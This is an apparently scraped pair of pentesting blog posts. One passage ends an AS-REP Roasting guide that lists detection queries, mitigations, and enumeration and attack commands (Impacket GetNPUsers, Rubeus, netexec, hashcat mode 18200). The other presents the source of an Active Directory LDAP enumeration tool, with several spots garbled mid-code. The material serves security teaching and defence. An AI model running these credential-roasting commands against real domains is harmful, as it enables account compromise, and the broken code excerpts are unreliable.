SecurityEvent | where EventID == 4768 | where PreAuthType == \u0026quot;0\u0026quot; Elastic: event.code:4768 AND winlog.event_data.PreAuthType:0 PowerShell: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth Mitigation Strategies: Disable the \u0026ldquo;Do not require Kerberos preauthentication\u0026rdquo; setting unless absolutely necessary Enforce strong password policies to reduce the risk of password cracking Use multifactor authentication (MFA) for accounts with elevated privileges Regularly review and audit account settings in Active Directory Defense in Depth Strategies: Network Segmentation: Implement network zones to limit access to the Domain Controller. Use PAWs (Privileged Access Workstations ) for administrative tasks. Deploy honeypot accounts with DONT_REQ_PREAUTH to detect attempts. Monitoring and Alerting: Set up automated scripts to monitor for DONT_REQ_PREAUTH changes. Create alerts for sudden increases in AS-REQ traffic. Monitor for known AS-REP Roasting tool signatures. Active Directory Hardening: Regular security assessments focusing on Kerberos configurations. Implement LAPS for local admin password management. This way if tickets are extracted they cannot be cracked. Use tiered administration model to limit attack surface. Common Misconfigurations in AD Environments that can lead to AS-REP Roasting: All of the below should be looked out for in your environments.\nDefault service account configurations in specific applications: Exchange Server service accounts SQL Server service accounts Legacy application service accounts Legacy systems requiring Kerberos compatibility Misconfigured trust relationships between domains Improperly migrated user accounts from older AD versions Third-party applications requiring DONT_REQ_PREAUTH for compatibility AS-REP-Roasting Enumeration Tools: +Note+: In all of the below enumeration \u0026amp; attack screenshots the user \u0026ldquo;svc-alfresco\u0026rdquo; is susceptible to AS-REP Roasting. Using PowerView to Enumerate users susceptible to AS-REP Roasting: Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof Using PowerShell to Enumerate users susceptible to AS-REP Roasting: Vanilla Powershell: (New-Object DirectoryServices.DirectorySearcher \u0026#34;(\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\u0026#34;).FindAll() | ForEach-Object { $_.Properties | Select-Object @{n=\u0026#39;sAMAccountName\u0026#39;;e={$_[\u0026#39;sAMAccountName\u0026#39;][0]}}, @{n=\u0026#39;displayName\u0026#39;;e={$_[\u0026#39;displayName\u0026#39;][0]}} } Using PowerShell \u0026amp; AD Module to Enumerate users susceptible to AS-REP Roasting: Powershell Active Directory Powershell Module: # Shows all details for User Account Get-ADUser -Filter {DoesNotRequirePreAuth -eq \u0026#39;True\u0026#39;} | fl # Provides just the name Get-ADUser -filter {DoesNotRequirePreAuth -eq \u0026#39;True\u0026#39;} | select name Using Powershell AD Module \u0026amp; an LDAP filter:\nGet-ADObject -LdapFilter \u0026#34;(\u0026amp;(\u0026amp;(\u0026amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))))\u0026#34; AS-REP Roasting +Attack+ Tools: Using Impacket-GetNPUsers for AS-REP Roasting Attack: # General command to find AS-REP roastable accounts impacket-GetNPUsers $domain/ -request -format hashcat -outputfile hashes.txt # With a specified users file and domain controller IP GetNPUsers.py [DOMAIN]/ -dc-ip [DC_IP] -usersfile [UserFile] -format hashcat -outputfile hashes.txt -no-pass # Example usage GetNPUsers.py SUGARAPE/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass Using Rubeus for AS-REP Roasting Attack: Has an ASREPRoast: module for Windows-based attacks: # Standard Rubeus Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt # If running via download cradle from PowerSharpPack PowerSharpPack -rubeus -Command \u0026#34;asreproast /format:hashcat /outfile:hashes.txt\u0026#34; Using Netexec for AS-REP Roasting Attack: In my experience this always needs a list of supplied users to attempt to asreproast with.\nnetexec ldap $machine.$domain -u Users.txt -p \u0026#39;\u0026#39; --asreproast asRepTickets.txt Targeted AS-REPRoasting Attack: If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute, request the AS-REP for offline cracking, then disable it again The success of this attack depends on the user having a weak password Cracking AS-Rep Tickets Using Hashcat:\nMode 18200 for cracking AS-REP hashes Command: hashcat -m 18200 asRepTickets.txt wordlist.txt -r rules/best64.rule Using John:\njohn --wordlist=~/Wordlist asRepTickets.txt Tool Comparison Matrix Tool Windows/Linux Auth Required Stealth Level Rubeus Windows Yes Medium Impacket Linux No High PowerView Windows Yes Low NetExec Both (User list) Medium Comparison with Other Attack Techniques: AS-REP Roasting vs Kerberoasting: Lower detection rate due to fewer logging mechanisms Smaller attack surface (fewer vulnerable accounts) Often overlooked in security audits No need for service account enumeration AS-REP Roasting vs Password Spraying: More stealthy as it doesn\u0026rsquo;t generate failed login attempts Can be performed without valid domain credentials Offline cracking reduces detection risk Targeted approach vs broad-spectrum attack Practice AS-REP Roasting on Hack The Box The following machines are good for practice AS-REP Roasting:\nhttps://app.hackthebox.com/machines/Forest +My Walkthrough+: https://bloodstiller.com/walkthroughs/forest-box/ https://app.hackthebox.com/prolabs/overview/Sauna +My Walkthrough+: https://bloodstiller.com/walkthroughs/sauna-box/ https://app.hackthebox.com/prolabs/overview/dante This is a prolab and AS-REP Roasting is one of many attack/privesc chains. ",

        "content": " Originally posted on 2024-10-17 updated on 2024-11-13 Introducing LDAPire: A Tool for Active Directory Reconnaissance As penetration testers and security professionals, we often find ourselves needing to quickly assess and enumerate Active Directory environments. Today, I\u0026rsquo;m excited to share a tool I\u0026rsquo;ve developed that streamlines this process: LDAPire - the LDAP Checker and Enumerator.\nYou can find the full source code and installation instructions for LDAPire on my GitHub repository: LDAPire on GitHub It\u0026rsquo;s very much in it\u0026rsquo;s infancy, however I plan on adding more features. What is LDAPire? LDAPire is a Python-based tool designed to connect to LDAP servers (primarily Active Directory Domain Controllers), perform authentication, and enumerate users and groups. It\u0026rsquo;s built with flexibility and ease of use in mind, making it an invaluable addition to any pentester\u0026rsquo;s toolkit.\nKey Features Advanced Connection Handling:\nSSL/TLS support with automatic fallback to non-SSL Support for both anonymous and authenticated binds Secure credential handling and validation Comprehensive Enumeration:\nComplete enumeration of users, groups, computers, and all domain objects Detailed attribute collection with proper formatting Advanced binary attribute handling (SIDs, GUIDs, Exchange attributes) Service Account Detection:\nAutomated identification of potential service accounts Pattern matching for common service account naming conventions Context-aware results with surrounding information Output Organization:\nBasic Information Files:\nUsers.txt: User SAM account names Groups.txt: Group SAM account names Computers.txt: Computer SAM account names Objects.txt: All object SAM account names Detailed Information Files:\nUsersDetailed.txt: Comprehensive user attributes GroupsDetailed.txt: Comprehensive group attributes ComputersDetailed.txt: Comprehensive computer attributes ObjectsDetailedLdap.txt: All domain object details Special Reports:\nAllObjectDescriptions.txt: Consolidated descriptions ServiceAccounts.txt: Potential service account findings Security Features:\nAnonymous bind detection and warning Secure credential handling Informative security status reporting Why Use This Tool? Time-Saving: Quickly gather essential AD information without manual queries or multiple tools. Comprehensive Data: Get both high-level and detailed views of users and groups in one go. Flexibility: Works with various AD configurations and authentication scenarios. Pentesting-Oriented: Designed with the needs of security professionals in mind. Code: I have placed the code here for convenience.\n#!/usr/bin/env python3 from ldap3 import Server, Connection, ALL, SUBTREE, ANONYMOUS from ldap3.core.exceptions import LDAPException import re import argparse import logging import getpass import sys def is_valid_ip(ip): pattern = re.compile(r\u0026#34;^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\u0026#34;) return pattern.match(ip) is not None # Setup logging logging.basicConfig(filename=\u0026#39;ldap_test.log\u0026#39;, level=logging.INFO) # Command-line argument parsing parser = argparse.ArgumentParser(description=\u0026#34;LDAP Anonymous Bind Test\u0026#34;) parser.add_argument(\u0026#39;dc_ip\u0026#39;, help=\u0026#34;IP address of the Domain Controller\u0026#34;) parser.add_argument(\u0026#39;-u\u0026#39;, \u0026#39;--user\u0026#39;, help=\u0026#34;Username for authentication\u0026#34;, default=\u0026#39;\u0026#39;) parser.add_argument(\u0026#39;-p\u0026#39;, \u0026#39;--password\u0026#39;, help=\u0026#34;Password for authentication\u0026#34;, default=\u0026#39;\u0026#39;) args = parser.parse_args() # Validate IP address srver = args.dc_ip if not is_valid_ip(srver): print(\u0026#34;Invalid IP address format.\u0026#34;) logging.error(f\u0026#34;Invalid IP address format: {srver}\u0026#34;) exit(1) # Handle secure password input user = args.user password = args.password if not password and user: password = getpass.getpass(\u0026#34;Enter password: \u0026#34;) def get_domain_from_dc_ip(dc_ip): try: import socket domain = socket.gethostbyaddr(dc_ip)[0] return \u0026#39;.\u0026#39;.join(domain.split(\u0026#39;.\u0026#39;)[1:]) # Remove the hostname part except: return None def construct_user_string(user, dc_ip): if \u0026#39;\\\\\u0026#39; in user or \u0026#39;,\u0026#39; in user: # Already in DOMAIN\\user or DN format return user domain = get_domain_from_dc_ip(dc_ip) if domain: return f\u0026#34;{domain}\\\\{user}\u0026#34; else: return user # Fallback to just the username if domain can\u0026#39;t be determined def attempt_connection(server, use_ssl, user, password): \u0026#34;\u0026#34;\u0026#34; Attempt to connect to LDAP server and verify read access Args: server (str): Server IP or hostname use_ssl (bool): Whether to use SSL/TLS user (str): Username for authentication password (str): Password for authentication Returns: tuple: (Server object, Connection object, bool indicating success) \u0026#34;\u0026#34;\u0026#34; protocol = \u0026#34;ldaps\u0026#34; if use_ssl else \u0026#34;ldap\u0026#34; port = 636 if use_ssl else 389 try: s = Server(server, port=port, use_ssl=use_ssl, get_info=ALL) if user and password: user_string = construct_user_string(user, server) c = Connection(s, user=user_string, password=password, authentication=\u0026#39;SIMPLE\u0026#39;, auto_bind=True) else: c = Connection(s, auto_bind=True) # Test for read access if hasattr(s.info, \u0026#39;other\u0026#39;) and \u0026#39;defaultNamingContext\u0026#39; in s.info.other: base_dn = s.info.other[\u0026#39;defaultNamingContext\u0026#39;][0] c.search(base_dn, \u0026#39;(objectClass=*)\u0026#39;, attributes=[\u0026#39;cn\u0026#39;], size_limit=1) if c.entries: return s, c, True return s, c, False except LDAPException as e: logging.error(f\u0026#34;Error connecting to the server with {protocol}://{server}:{port}: {e}\u0026#34;) return None, None, False def perform_ldap_search(connection, base_dn, search_filter, attribute): try: connection.search(search_base=base_dn, search_filter=search_filter, search_scope=SUBTREE, attributes=[attribute]) return [entry[attribute].value for entry in connection.entries if attribute in entry] except LDAPException as e: logging.error(f\u0026#34;Error performing LDAP search: {e}\u0026#34;) return [] def write_results_to_file(results, filename): with open(filename, \u0026#39;w\u0026#39;) as f: for item in results: f.write(f\u0026#34;{item}\\n\u0026#34;) print(f\u0026#34;[+] Results written to {filename}\\n\u0026#34;) def perform_ldap_search_all_attributes(connection, base_dn, search_filter): try: connection.search(search_base=base_dn, search_filter=search_filter, search_scope=SUBTREE, attributes=[\u0026#39;*\u0026#39;]) return connection.entries except LDAPException as e: logging.error(f\u0026#34;Error performing LDAP search: {e}\u0026#34;) return [] def sid_to_str(sid): \u0026#34;\u0026#34;\u0026#34; Convert a binary SID (Security Identifier) to its string representation. Format: S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx Args: sid (bytes): Binary SID data Returns: str: String representation of the SID or error message \u0026#34;\u0026#34;\u0026#34; try: # Check if SID is empty or all zeros if all(b == 0 for b in sid): return \u0026#34;\u0026lt;all zeros\u0026gt;\u0026#34; # Get revision number (first byte) revision = int(sid[0]) # Get count of sub-authorities (second byte) sub_authorities = int(sid[1]) # Get identifier authority (bytes 2-7, big endian) identifier_authority = int.from_bytes(sid[2:8], byteorder=\u0026#39;big\u0026#39;) # Convert authority to hex if it\u0026#39;s a large number if identifier_authority \u0026gt;= 2 ** 32: identifier_authority = hex(identifier_authority) # Extract sub-authorities (remaining bytes in 4-byte chunks, little endian) sub_authority = \u0026#39;-\u0026#39; + \u0026#39;-\u0026#39;.join([ str(int.from_bytes(sid[8 + (i * 4): 12 + (i * 4)], byteorder=\u0026#39;little\u0026#39;)) for i in range(sub_authorities) ]) return \u0026#39;S-\u0026#39; + str(revision) + \u0026#39;-\u0026#39; + str(identifier_authority) + sub_authority except Exception as e: if all(b == 0 for b in sid): return \u0026#34;\u0026lt;all zeros\u0026gt;\u0026#34; return f\u0026#34;\u0026lt;error converting SID: 0x{sid.hex()}\u0026gt;\u0026#34; def convert_guid(binary_guid): \u0026#34;\u0026#34;\u0026#34; Convert binary GUID to standard string format. Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx Args: binary_guid (bytes): Binary GUID data Returns: str: String representation of the GUID \u0026#34;\u0026#34;\u0026#34; try: hex_guid = binary_guid.hex() return f\u0026#34;{hex_guid[6:8]}{hex_guid[4:6]}{hex_guid[2:4]}{hex_guid[0:2]}-\u0026#34; \\ f\u0026#34;{hex_guid[10:12]}{hex_guid[8:10]}-\u0026#34; \\ f\u0026#34;{hex_guid[14:16]}{hex_guid[12:14]}-\u0026#34; \\ f\u0026#34;{hex_guid[16:20]}-\u0026#34; \\ f\u0026#34;{hex_guid[20:]}\u0026#34; except Exception: return f\u0026#34;\u0026lt;invalid GUID format: {binary_guid.hex()}\u0026gt;\u0026#34; def convert_exchange_binary(attribute_name, binary_value): \u0026#34;\u0026#34;\u0026#34; Convert various Exchange and AD binary attributes to readable format. Handles different types of binary data based on attribute name. Args: attribute_name (str): Name of the attribute being converted binary_value (bytes): Binary data to convert Returns: str: Converted string representation of the binary data \u0026#34;\u0026#34;\u0026#34; try: # Handle empty or all zero values if not binary_value or all(b == 0 for b in binary_value): return \u0026#34;\u0026lt;all zeros\u0026gt;\u0026#34; # Convert based on attribute type if attribute_name.lower() in [\u0026#39;msexchmailboxguid\u0026#39;, \u0026#39;msexcharchiveguid\u0026#39;]: # Exchange GUIDs use standard GUID format return convert_guid(binary_value) elif attribute_name.lower() in [\u0026#39;objectsid\u0026#39;, \u0026#39;msexchmasteraccountsid\u0026#39;]: # SIDs need special conversion return sid_to_str(binary_value) elif attribute_name.lower() in [\u0026#39;msexchmailboxsecuritydescriptor\u0026#39;, \u0026#39;repluptodatevector\u0026#39;, \u0026#39;dsasignature\u0026#39;, \u0026#39;auditingpolicy\u0026#39;]: # These attributes are displayed in hex format return f\u0026#34;0x{binary_value.hex()}\u0026#34; else: # Unknown binary attributes show their length return f\u0026#34;\u0026lt;binary data length={len(binary_value)}\u0026gt;\u0026#34; except Exception as e: return f\u0026#34;\u0026lt;error converting {attribute_name}: {str(e)}\u0026gt;\u0026#34; def write_detailed_results_to_file(results, filename): # Track which attributes were converted to hex hex_converted_attrs = set() with open(filename, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;) as f: for entry in results: try: f.write(f\u0026#34;DN: {entry.entry_dn}\\n\u0026#34;) for attribute in entry.entry_attributes: try: values = entry[attribute].values # Handle different types of values if isinstance(values, (list, set)): cleaned_values = [] for value in values: if isinstance(value, bytes): # Special handling for different binary attributes if attribute.lower() == \u0026#39;objectsid\u0026#39;: cleaned_values.append(sid_to_str(value)) elif attribute.lower() == \u0026#39;objectguid\u0026#39;: cleaned_values.append(convert_guid(value)) elif attribute.lower() in [\u0026#39;msexchmailboxguid\u0026#39;, \u0026#39;msexcharchiveguid\u0026#39;, \u0026#39;msexchmailboxsecuritydescriptor\u0026#39;, \u0026#39;repluptodatevector\u0026#39;, \u0026#39;msexchmasteraccountsid\u0026#39;, \u0026#39;dsasignature\u0026#39;, \u0026#39;auditingpolicy\u0026#39;]: result = convert_exchange_binary(attribute, value) cleaned_values.append(result) # Track hex converted attributes if result.startswith(\u0026#39;0x\u0026#39;): hex_converted_attrs.add(attribute) else: try: cleaned_values.append(value.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;)) except: cleaned_values.append(f\u0026#34;\u0026lt;binary data length={len(value)}\u0026gt;\u0026#34;) else: cleaned_values.append(str(value)) if len(cleaned_values) == 1: f.write(f\u0026#34;{attribute}: {cleaned_values[0]}\\n\u0026#34;) else: f.write(f\u0026#34;{attribute}:\\n\u0026#34;) for value in cleaned_values: f.write(f\u0026#34; {value}\\n\u0026#34;) else: if isinstance(values, bytes): # Special handling for different binary attributes if attribute.lower() == \u0026#39;objectsid\u0026#39;: value_str = sid_to_str(values) elif attribute.lower() == \u0026#39;objectguid\u0026#39;: value_str = convert_guid(values) elif attribute.lower() in [\u0026#39;msexchmailboxguid\u0026#39;, \u0026#39;msexcharchiveguid\u0026#39;, \u0026#39;msexchmailboxsecuritydescriptor\u0026#39;, \u0026#39;repluptodatevector\u0026#39;, \u0026#39;msexchmasteraccountsid\u0026#39;, \u0026#39;dsasignature\u0026#39;, \u0026#39;auditingpolicy\u0026#39;]: value_str = convert_exchange_binary(attribute, values) # Track hex converted attributes if value_str.startswith(\u0026#39;0x\u0026#39;): hex_converted_attrs.add(attribute) else: try: value_str = values.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;) except: value_str = f\u0026#34;\u0026lt;binary data length={len(values)}\u0026gt;\u0026#34; else: value_str = str(values) f.write(f\u0026#34;{attribute}: {value_str}\\n\u0026#34;) except Exception as e: f.write(f\u0026#34;{attribute}: \u0026lt;error reading value: {str(e)}\u0026gt;\\n\u0026#34;) f.write(\u0026#34;\\n\u0026#34;) except Exception as e: f.write(f\u0026#34;\u0026lt;error processing entry: {str(e)}\u0026gt;\\n\\n\u0026#34;) # Write summary of hex-converted attributes if hex_converted_attrs: f.write(\u0026#34;\\n=== CONVERSION SUMMARY ===\\n\u0026#34;) f.write(\u0026#34;The following attributes were converted to hexadecimal format:\\n\u0026#34;) for attr in sorted(hex_converted_attrs): f.write(f\u0026#34;- {attr}\\n\u0026#34;) print(f\u0026#34;[+] Detailed results written to {filename}\u0026#34;) def write_groups_to_file(results, filename): \u0026#34;\u0026#34;\u0026#34; Write LDAP group query results to a file with proper attribute formatting. Handles binary data conversion for special attributes like SIDs and GUIDs. Args: results: LDAP query results containing group entries filename (str): Output file path \u0026#34;\u0026#34;\u0026#34; with open(filename, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;) as f: for entry in results: try: f.write(f\u0026#34;DN: {entry.entry_dn}\\n\u0026#34;) for attribute in entry.entry_attributes: try: values = entry[attribute].values # Handle multi-valued attributes if isinstance(values, (list, set)): if len(values) == 1: # Single value in a list if isinstance(values[0], bytes): # Handle binary attributes if attribute.lower() == \u0026#39;objectsid\u0026#39;: f.write(f\u0026#34;{attribute}: {sid_to_str(values[0])}\\n\u0026#34;) elif attribute.lower() == \u0026#39;objectguid\u0026#39;: f.write(f\u0026#34;{attribute}: {convert_guid(values[0])}\\n\u0026#34;) else: try: f.write(f\u0026#34;{attribute}: {values[0].decode(\u0026#39;utf-8\u0026#39;)}\\n\u0026#34;) except: f.write(f\u0026#34;{attribute}: \u0026lt;binary data length={len(values[0])}\u0026gt;\\n\u0026#34;) else: f.write(f\u0026#34;{attribute}: {values[0]}\\n\u0026#34;) else: # Multiple values f.write(f\u0026#34;{attribute}:\\n\u0026#34;) for value in values: if isinstance(value, bytes): try: f.write(f\u0026#34; {value.decode(\u0026#39;utf-8\u0026#39;)}\\n\u0026#34;) except: f.write(f\u0026#34; \u0026lt;binary data length={len(value)}\u0026gt;\\n\u0026#34;) else: f.write(f\u0026#34; {value}\\n\u0026#34;) else: # Single value attributes if isinstance(values, bytes): if attribute.lower() == \u0026#39;objectsid\u0026#39;: f.write(f\u0026#34;{attribute}: {sid_to_str(values)}\\n\u0026#34;) elif attribute.lower() == \u0026#39;objectguid\u0026#39;: f.write(f\u0026#34;{attribute}: {convert_guid(values)}\\n\u0026#34;) else: try: f.write 6#34;*60) print(\u0026#34; \u0026#34;*20 + \u0026#34;LDAP Information Retrieval\u0026#34;) print(\u0026#34; \u0026#34;*22 + \u0026#34;Domain Enumeration\u0026#34;) print(\u0026#34;=\u0026#34;*60 + \u0026#34;\\n\u0026#34;) def print_section_header(section): \u0026#34;\u0026#34;\u0026#34;Print a section header\u0026#34;\u0026#34;\u0026#34; print(\u0026#34;\\n\u0026#34; + \u0026#34;-\u0026#34;*60) print(f\u0026#34; {section}\u0026#34;) print(\u0026#34;-\u0026#34;*60) def find_service_accounts(output_file=\u0026#39;ServiceAccounts.txt\u0026#39;): \u0026#34;\u0026#34;\u0026#34; Search through all generated files for potential service account information. Looks for \u0026#39;svc\u0026#39; and \u0026#39;service\u0026#39; in the content. Args: output_file (str): Name of the file to write results to \u0026#34;\u0026#34;\u0026#34; print(\u0026#34;\\n-----------------------------------------------------------\u0026#34;) print(\u0026#34; Searching for Service Accounts\u0026#34;) print(\u0026#34;------------------------------------------------------------\u0026#34;) # List of files to search through files_to_search = [ \u0026#39;Users.txt\u0026#39;, \u0026#39;UsersDetailed.txt\u0026#39;, \u0026#39;Groups.txt\u0026#39;, \u0026#39;GroupsDetailed.txt\u0026#39;, \u0026#39;Objects.txt\u0026#39;, \u0026#39;ObjectsDetailedLdap.txt\u0026#39;, \u0026#39;AllObjectDescriptions.txt\u0026#39; ] service_accounts = set() # Use set to avoid duplicates matches_found = 0 # Search patterns patterns = [\u0026#39;svc\u0026#39;, \u0026#39;service\u0026#39;, \u0026#39;srvc\u0026#39;, \u0026#39;svc_\u0026#39;, \u0026#39;service_\u0026#39;] with open(output_file, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as outfile: outfile.write(\u0026#34;=== Potential Service Accounts Found ===\\n\\n\u0026#34;) for filename in files_to_search: try: with open(filename, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) as f: print(f\u0026#34; 🔍 Searching {file ddress of the Domain Controller Returns: tuple: (hostname, domain_name) or (None, None) if lookup fails \u0026#34;\u0026#34;\u0026#34; try: import socket fqdn = socket.gethostbyaddr(dc_ip)[0] hostname = fqdn.split(\u0026#39;.\u0026#39;)[0] domain_name = \u0026#39;.\u0026#39;.join(fqdn.split(\u0026#39;.\u0026#39;)[1:]) return hostname, domain_name except: return None, None def get_domain_info_from_ldap(server_info): \u0026#34;\u0026#34;\u0026#34; Extract domain and hostname information from LDAP server info Args: server_info: LDAP server info object Returns: tuple: (hostname, domain_name) or (None, None) if not found \u0026#34;\u0026#34;\u0026#34; try: # Try to get from serverName first if hasattr(server_info, \u0026#39;other\u0026#39;) and \u0026#39;serverName\u0026#39; in server_info.other: server_name = server_info.other[\u0026#39;serverName\u0026#39;][0] # Extract hostname from CN=FOREST,CN=Servers,... hostname = server_name.split(\u0026#39;,\u0026#39;)[0].replace(\u0026#39;CN=\u0026#39;, \u0026#39;\u0026#39;) # Try to get from ldapServiceName if serverName failed elif hasattr(server_info, \u0026#39;other\u0026#39;) and \u0026#39;ldapServiceName\u0026#39; in server_info.other: service_name = server_info.other[\u0026#39;ldapServiceName\u0026#39;][0] # Format: domain:hostname$@DOMAIN hostname = service_name.split(\u0026#39;:\u0026#39;)[1].split(\u0026#39;@\u0026#39;)[0].replace(\u0026#39;$\u0026#39;, \u0026#39;\u0026#39;) else: hostname = None # Get domain from naming context if hasattr(server_info, \u0026#39;other\u0026#39;) and \u0026#39;defaultNamingContext\u0026#39; in server_info.other: naming_context = server_info.other[\u0026#39;defaultNamingContext\u0026#39;][0] # Extract DC components and join them domain_parts = [dc.replace(\u0026#39;DC=\u0026#39;, \u0026#39;\u0026#39;) for dc in naming_context.split(\u0026#39;,\u0026#39;) if dc.startswith(\u0026#39;DC=\u0026#39;)] domain_name = \u0026#39;.\u0026#39;.join(domain_parts) else: domain_name = None return hostname, domain_name except: return None, None def process_ldap_results(conn, base_dn, server_ip): \u0026#34;\u0026#34;\u0026#34; Process LDAP query results and write to various output files. \u0026#34;\u0026#34;\u0026#34; print_banner() # Get and display host/domain information hostname, domain_name = get_host_and_domain_info(server_ip) print_section_header(\u0026#34;Target Information\u0026#34;) print(f\u0026#34; • IP Address : {server_ip}\u0026#34;) if hostname: print(f\u0026#34; • Hostname : {hostname}\u0026#34;) if domain_name: print(f\u0026#34; • Domain Name : {domain_name}\u0026#34;) print() # Users Section print_section_header(\u0026#34;Processing Users\u0026#34;) users_filter = \u0026#39;(objectClass=user)\u0026#39; conn.search(base_dn, users_filter, attributes=[\u0026#39;*\u0026#39;]) users = conn.entries write_detailed_results_to_file(users, \u0026#39;UsersDetailed.txt\u0026#39;) write_basic_names_to_file(users, \u0026#39;Users.txt\u0026#39;) print(f\u0026#34; ✓ Basic user names → Users.txt\u0026#34;) print(f\u0026#34; ✓ Detailed user info → UsersDetailed.txt\u0026#34;) # Groups Section print_section_header(\u0026#34;Processing Groups\u0026#34;) groups_filter = \u0026#39;(objectClass=group)\u0026#39; conn.search(base_dn, groups_filter, attributes=[\u0026#39;*\u0026#39;]) groups = conn.entries write_groups_to_file(groups, \u0026#39;GroupsDetailed.txt\u0026#39;) write_basic_names_to_file(groups, \u0026#39;Groups.txt\u0026#39;) print(f\u0026#34; ✓ Basic group names → Groups.txt\u0026#34;) print(f\u0026#34; ✓ Detailed group info → GroupsDetailed.txt\u0026#34;) # Computers Section print_section_header(\u0026#34;Processing Computers\u0026#34;) computers_filter = \u0026#39;(objectClass=computer)\u0026#39; conn.search(base_dn, computers_filter, attributes=[\u0026#39;*\u0026#39;]) computers = conn.entries write_computers_to_file(computers, \u0026#39;ComputersDetailed.txt\u0026#39;) write_basic_names_to_file(computers, \u0026#39;Computers.txt\u0026#39;) print(f\u0026#34; ✓ Basic computer names → Computers.txt\u0026#34;) print(f\u0026#34; ✓ Detailed computer info → ComputersDetailed.txt\u0026#34;) # All Objects Section print_section_header(\u0026#34;Processing All Objects\u0026#34;) all_objects_filter = \u0026#39;(objectClass=*)\u0026#39; conn.search(base_dn, all_objects_filter, attributes=[\u0026#39;*\u0026#39;]) all_objects = conn.entries write_detailed_results_to_file(all_objects, \u0026#39;ObjectsDetailedLdap.txt\u0026#39;) write_basic_names_to_file(all_objects, \u0026#39;Objects.txt\u0026#39;) print(f\u0026#34; ✓ Basic object names → Objects.txt\u0026#34;) print(f\u0026#34; ✓ Detailed object info → ObjectsDetailedLdap.txt\u0026#34;) # Descriptions Section print_section_header(\u0026#34;Processing Descriptions\u0026#34;) write_all_descriptions_to_file([users, groups, computers], \u0026#39;AllObjectDescriptions.txt\u0026#39;) print(f\u0026#34; ✓ All object descriptions → AllObjectDescriptions.txt\u0026#34;) # Search for service accounts find_service_accounts() # Security check print_section_header(\u0026#34;Security Check\u0026#34;) anon_bind = check_anonymous_bind(server_ip) if anon_bind: print(\u0026#34; ⚠️ WARNING: Anonymous Bind is ENABLED\u0026#34;) print(\u0026#34; ⚠️ This is a security risk and should be disabled\\n\u0026#34;) else: print(\u0026#34; ✓ Anonymous Bind is DISABLED\u0026#34;) print(\u0026#34; ✓ This is the recommended secure configuration\\n\u0026#34;) # Summary print(\u0026#34;=\u0026#34; * 60) print(\u0026#34; \u0026#34; * 20 + \u0026#34;Enumeration Complete!\u0026#34;) print(\u0026#34;=\u0026#34; * 60 + \u0026#34;\\n\u0026#34;) def get_basic_server_info(dc_ip): \u0026#34;\u0026#34;\u0026#34; Get basic server information that\u0026#39;s typically available without authentication \u0026#34;\u0026#34;\u0026#34; try: server = Server(dc_ip, get_info=ALL) conn = Connection(server) conn.bind() print(\u0026#34;\\n------------------------------------------------------------\u0026#34;) print(\u0026#34; Server Information\u0026#34;) print(\u0026#34;------------------------------------------------------------\u0026#34;) print(f\u0026#34; • IP Address : {dc_ip}\u0026#34;) if hasattr(server.info, \u0026#39;other\u0026#39;): info = server.info.other # Get naming context if \u0026#39;defaultNamingContext\u0026#39; in info: domain_parts = [dc.replace(\u0026#39;DC=\u0026#39;, \u0026#39;\u0026#39;) for dc in info[\u0026#39;defaultNamingContext\u0026#39;][0].split(\u0026#39;,\u0026#39;) if dc.startswith(\u0026#39;DC=\u0026#39;)] print(f\u0026#34; • Domain Name : {\u0026#39;.\u0026#39;.join(domain_parts)}\u0026#34;) # Get server name if \u0026#39;serverName\u0026#39; in info: hostname = info[\u0026#39;serverName\u0026#39;][0].split(\u0026#39;,\u0026#39;)[0].replace(\u0026#39;CN=\u0026#39;, \u0026#39;\u0026#39;) print(f\u0026#34; • Server Name : {hostname}\u0026#34;) elif \u0026#39;ldapServiceName\u0026#39; in info: hostname = info[\u0026#39;ldapServiceName\u0026#39;][0].split(\u0026#39;:\u0026#39;)[1].split(\u0026#39;@\u0026#39;)[0].replace(\u0026#39;$\u0026#39;, \u0026#39;\u0026#39;) print(f\u0026#34; • Server Name : {hostname}\u0026#34;) # Get forest functional level if available if \u0026#39;forestFunctionality\u0026#39; in info: print(f\u0026#34; • Forest Level: {info[\u0026#39;forestFunctionality\u0026#39;][0]}\u0026#34;) # Get domain functional level if available if \u0026#39;domainFunctionality\u0026#39; in info: print(f\u0026#34; • Domain Level: {info[\u0026#39;domainFunctionality\u0026#39;][0]}\u0026#34;) print() # Empty line for spacing except Exception as e: print(\u0026#34; • Could not retrieve server information\u0026#34;) logging.error(f\u0026#34;Error getting server info: {str(e)}\u0026#34;) def main(): \u0026#34;\u0026#34;\u0026#34;Main function to handle LDAP enumeration\u0026#34;\u0026#34;\u0026#34; # Get basic server information first (usually available without auth) get_basic_server_info(args.dc_ip) # Check if anonymous bind is enabled anon_enabled = check_anonymous_bind(args.dc_ip) # If no credentials provided and anonymous bind is disabled, exit early if not user and not anon_enabled: print(\u0026#34;------------------------------------------------------------\u0026#34;) print(\u0026#34; Access Denied\u0026#34;) print(\u0026#34;------------------------------------------------------------\u0026#34;) print(\u0026#34; ✓ Anonymous Bind is DISABLED (Secure Configuration)\u0026#34;) print(\u0026#34; • No credentials provided\u0026#34;) print(\u0026#34; • Please provide valid credentials to enumerate\u0026#34;) print(\u0026#34; • Use: -u USERNAME -p PASSWORD\\n\u0026#34;) sys.exit(1) # Connection attempts header print(\u0026#34;------------------------------------------------------------\u0026#34;) 